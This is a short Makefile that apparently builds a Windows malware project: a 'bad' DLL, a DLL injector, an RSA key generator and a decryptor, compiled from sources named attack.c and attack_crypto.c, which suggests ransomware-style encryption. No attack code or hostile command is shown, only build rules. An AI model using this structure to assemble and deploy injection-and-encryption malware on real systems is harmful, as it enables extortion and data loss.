CC = gcc
# Directories
SRC_DIR   = src
BUILD_DIR = build

# Includes
INC_DIR = include
CFLAGS = -Wall -I$(SRC_DIR) -I$(INC_DIR)

# Sources

SRC_ATTACK_CRYPTO = $(SRC_DIR)/attack_crypto.c

SRC_ATTACK        = $(SRC_DIR)/attack.c $(SRC_ATTACK_CRYPTO)

GET_DIR_SRC      = $(SRC_DIR)/get_dir.c

DLL_SRC          = $(SRC_DIR)/bad_dll.c $(SRC_DIR)/attack.c $(GET_DIR_SRC)

INJECTOR_SRC     = $(SRC_DIR)/dll_injector.c $(GET_DIR_SRC)

DECRYPT_SRC      = $(SRC_DIR)/decrypt.c $(GET_DIR_SRC)

GENERATE_RSA_SRC = $(SRC_DIR)/generate_rsa.c

# Targets

BAD_DLL      = $(BUILD_DIR)/bad_dll.dll
INJECTOR_EXE = $(BUILD_DIR)/dll_injector.exe
DECRYPT_EXE  = $(BUILD_DIR)/decrypt.exe
RSA_EXE      = $(BUILD_DIR)/generate_rsa.exe

all: $(BAD_DLL) $(INJECTOR_EXE) $(DECRYPT_EXE) $(RSA_EXE)

# Build directory
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

# DLL

$(BAD_DLL): $(DLL_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -shared -o $@ $^

# EXEs

$(INJECTOR_EXE): $(INJECTOR_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^

$(DECRYPT_EXE): $(DECRYPT_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ 

$(RSA_EXE): $(GENERATE_RSA_SRC) | $(BUILD_DIR)
	$(CC) $(CFLAGS) -o $@ $^ 

# Clean
clean:
	rm -f $(BUILD_DIR)/*.exe $(BUILD_DIR)/*.dll
